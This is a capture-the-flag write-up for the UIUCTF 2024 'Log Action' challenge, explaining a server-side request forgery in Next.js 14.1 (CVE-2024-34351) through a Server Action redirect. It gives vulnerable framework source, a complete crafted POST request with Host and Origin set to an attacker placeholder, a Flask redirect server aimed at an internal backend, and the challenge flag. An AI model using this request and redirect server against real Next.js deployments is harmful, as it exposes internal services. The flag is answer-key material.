#nextjs #ssrf
# Log Action
## Description
I keep trying to log in, but it's not working :'(
[http://log-action.challenge.uiuc.tf/](http://log-action.challenge.uiuc.tf/)
Downloads
- [log-action.zip](https://uiuctf-2024-rctf-challenge-uploads.storage.googleapis.com/uploads/eb5b17b1e10f9f5838cb671042bbf9ee7baaa71c0c00bcd0935fd34c420b0139/log-action.zip)
## Overview
Simple login page
## Road to flag
The flag is retured by an internal server -> SSRF
### Dependencies
- NextJS 14.1
	- Vulnerable to CVE-2024-34351 
		- https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps
		- https://github.com/azu/nextjs-CVE-2024-34351
## Code review		  
 Logout handler
```jsx
import Link from "next/link";
import { redirect } from "next/navigation";
import { signOut } from "@/auth";

export default function Page() {
  return (
    <>
      <h1 className="text-2xl font-bold">Log out</h1>
      <p>Are you sure you want to log out?</p>
      <Link href="/admin">
        Go back
      </Link>
      <form
        action={async () => {
          "use server";
          await signOut({ redirect: false });
          redirect("/login");
        }}
      >
        <button type="submit">Log out</button>
      </form>
    </>
  )
}
```
It uses a **Server Action** that allows to execute code at server side.
`/logout` is not protected by the auth middleware, that redirects only on successful login, this makes it exploitable.

A server action that responds with a redirect calls this function:
```js
async function createRedirectRenderResult(
  req: BaseNextRequest,
  res: BaseNextResponse,
  originalHost: Host,
  redirectUrl: string,
  basePath: string,
  staticGenerationStore: StaticGenerationStore
) {
  res.setHeader('x-action-redirect', redirectUrl)
  [...]
  // If we're redirecting to another route of this Next.js application, we'll
  // try to stream the response from the other worker path. When that works,
  // we can save an extra roundtrip and avoid a full page reload.
  // When the redirect URL starts with a `/`, or to the same host as application,
  // we treat it as an app-relative redirect.
  const parsedRedirectUrl = new URL(redirectUrl, 'http://n')
  const isAppRelativeRedirect =
    redirectUrl.startsWith('/') ||
    (originalHost && originalHost.value === parsedRedirectUrl.host)

  if (isAppRelativeRedirect) {
    [...]
    const forwardedHeaders = getForwardedHeaders(req, res)
    forwardedHeaders.set(RSC_HEADER, '1')
    
    const proto =
      staticGenerationStore.incrementalCache?.requestProtocol || 'https'

    // For standalone or the serverful mode, use the internal origin directly
    // other than the host headers from the request.
    const origin =
      process.env.__NEXT_PRIVATE_ORIGIN || `${proto}://${originalHost.value}`

    const fetchUrl = new URL(
      `${origin}${basePath}${parsedRedirectUrl.pathname}${parsedRedirectUrl.search}`
    )
    [...]
    try {
      const response = await fetch(fetchUrl, {
        method: 'GET',
        headers: forwardedHeaders,
        next: {
          // @ts-ignore
          internal: 1,
        },
      })

      if (response.headers.get('content-type') === RSC_CONTENT_TYPE_HEADER) {
        [...]
        return new FlightRenderResult(response.body!)
      } else {
        [...]
      }
    } catch (err) {
      [...]
    }
  }

  return RenderResult.fromStatic('{}')
}
```

If the redirect url starts with `/` the server will fetch the result of the redirect at server side and return back.

## Exploitation
- SSRF via Host Header and Origin
Sending the following request triggers the SSRF:
```
POST /logout HTTP/1.1
Host: ATTACKER
Origin: https://ATTACKER
Accept: text/x-component
Next-Action: c3a144622dd5b5046f1ccb6007fea3f3710057de
Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22logout%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D
Content-Type: multipart/form-data; boundary=---------------------------30523002528298602961754182131
Content-Length: 331
Connection: keep-alive
Cookie: authjs.csrf-token=3a88d122c42873637d81db77edf8571e94e78697010629b27d9d1632876b75ad%7C250eafa2f8899729450d0228f76b528c95b155ca24e929d61e934ce559b299b5

-----------------------------30523002528298602961754182131
Content-Disposition: form-data; name="1_$ACTION_ID_c3a144622dd5b5046f1ccb6007fea3f3710057de"


-----------------------------30523002528298602961754182131
Content-Disposition: form-data; name="0"

["$K1"]
-----------------------------30523002528298602961754182131--
```

Simple server that redirects to the flag
```python
from flask import Flask, Response, request, redirect
app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch(path):
    if request.method == 'HEAD':
        resp = Response("")
        resp.headers['Content-Type'] = 'text/x-component'
        return resp
    return redirect('http://backend/flag.txt')

if __name__ == '__main__':
    app.run()
```

`uiuctf{close_enough_nextjs_server_actions_welcome_back_php}`